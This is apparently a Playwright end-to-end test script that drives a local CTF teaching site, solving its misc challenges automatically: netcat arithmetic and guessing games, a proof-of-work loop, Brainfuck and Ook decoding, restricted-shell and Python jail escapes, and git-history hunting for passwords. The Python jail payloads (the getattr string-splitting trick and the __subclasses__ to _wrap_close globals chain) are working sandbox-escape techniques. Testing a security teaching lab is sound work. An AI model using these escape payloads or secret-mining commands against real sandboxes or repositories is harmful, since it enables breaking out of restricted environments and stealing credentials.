import { chromium } from "playwright-core";
process.env.TMPDIR = new URL("./tmp", import.meta.url).pathname;
const b = await chromium.launch({ executablePath: process.env.HOME + "/.cache/ms-playwright/chromium-1243/chrome-linux64/chrome" });
const p = await b.newPage({ viewport: { width: 1440, height: 900 } });
const errs = []; p.on("pageerror", e => errs.push(e.message));
const B = "http://127.0.0.1:9107/";
const run = async (sh, cmd, wait = 100) => { const i = sh.locator(".shell-line input"); await i.fill(cmd); await i.press("Enter"); await p.waitForTimeout(wait); };
const out = async (sh) => (await sh.locator(".shell-out").innerText());
// prog
await p.goto(B + "#/learn/misc-prog"); await p.waitForTimeout(800);
let sh = p.locator(".shell").first();
await run(sh, "nc lab.zctf.local 4000");
let txt = await out(sh);
const qs = [...txt.matchAll(/^\d+\) (-?\d+) ([+\-*%]) (-?\d+)$/gm)].map(m => { const a=+m[1], b2=+m[3]; return {"+":a+b2,"-":a-b2,"*":a*b2,"%":a%b2}[m[2]]; });
console.log("questions", qs.length);
await run(sh, qs.join(" "));
await run(sh, "nc lab.zctf.local 4001");
let lo = 1, hi = 1000000;
for (let k = 0; k < 20; k++) { const mid = (lo + hi) >> 1; await run(sh, String(mid), 30); const t = (await out(sh)).trim().split("\n"); const last = t.slice(-3).join(" "); if (/ĐÚNG/.test(last)) break; if (/LỚN HƠN\s*\S*\s*$|LỚN HƠN[^]*số>\s*$/.test(t.at(-2) + " " + t.at(-1)) && /LỚN HƠN/.test(t.at(-2))) lo = mid + 1; else hi = mid - 1; }
console.log("PROG:", (await out(sh)).match(/zCTF\{[^}]+\}/g));
// pow via python editor
const ed = p.locator(".py-editor").first();
await ed.locator("textarea").fill('import hashlib\nn=1\nwhile not hashlib.sha256(str(n).encode()).hexdigest().startswith("00000"): n+=1\nprint(n)');
await ed.locator("button[data-a=run]").click(); await p.waitForTimeout(25000);
console.log("POW:", await ed.locator(".py-out").innerText(), await ed.locator(".py-status").innerText());
// eso
await p.goto(B + "#/learn/misc-eso"); await p.waitForTimeout(800);
const bf = p.locator(".bf-box");
const datas = await p.locator(".chal-data").allInnerTexts();
await bf.locator("textarea").fill(datas[0]); await bf.locator("button[data-a=run]").click(); console.log("BF:", await bf.locator(".py-out").innerText());
await bf.locator("select").selectOption("ook"); await bf.locator("textarea").fill(datas[1]); await bf.locator("button[data-a=run]").click(); console.log("OOK:", await bf.locator(".py-out").innerText());
await p.locator(".bf-box").screenshot({ path: new URL("./shots/m-bf.png", import.meta.url).pathname });
// jail
await p.goto(B + "#/learn/misc-jail"); await p.waitForTimeout(800);
sh = p.locator(".shell").first();
for (const c of ["cat flag.txt", "rev flag.txt | rev", "sort flag.txt"]) await run(sh, c);
console.log("RBASH:", (await out(sh)).split("\n").slice(-5).join(" | "));
const j1 = p.locator(".shell").nth(1), j2 = p.locator(".shell").nth(2);
await run(j1, "open('/tmp/jail1/flag.txt').read()", 12000);
await run(j1, "getattr(__builtins__, 'op'+'en')('/tmp/jail1/fl'+'ag.txt').read()", 500);
console.log("J1:", (await out(j1)).split("\n").slice(-4).join(" | "));
await run(j2, "().__class__", 800);
await run(j2, "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['__builtins__']['op'+'en']('/tmp/jail2/fl'+'ag.txt').read()", 800);
console.log("J2:", (await out(j2)).split("\n").slice(-4).join(" | "));
await p.locator(".shell").nth(2).screenshot({ path: new URL("./shots/m-jail.png", import.meta.url).pathname });
// git
await p.goto(B + "#/learn/misc-git"); await p.waitForTimeout(800);
sh = p.locator(".shell").first();
for (const c of ["git log", "cd webapp", "git log --oneline --all", "git log -p | grep -i password", "git show a83b02f:config.py", "git branch -a", "git show dev:admin_todo.txt", "git checkout dev", "ls", "git stash list", "git stash show -p", "git diff a83b02f c7e5d4b", "git reflog", "cat .git/HEAD"]) await run(sh, c);
console.log("GIT:\n" + (await out(sh)).split("\n").slice(-75).join("\n"));
await p.locator(".shell").first().screenshot({ path: new URL("./shots/m-git.png", import.meta.url).pathname });
await p.goto(B + "#/glossary"); await p.waitForTimeout(600);
await p.locator(".search").fill("endian"); await p.waitForTimeout(200);
console.log("GLOSS:", (await p.locator(".gloss").innerText()).slice(0, 200));
await p.screenshot({ path: new URL("./shots/m-gloss.png", import.meta.url).pathname });
console.log("ERRS", errs);
await b.close();
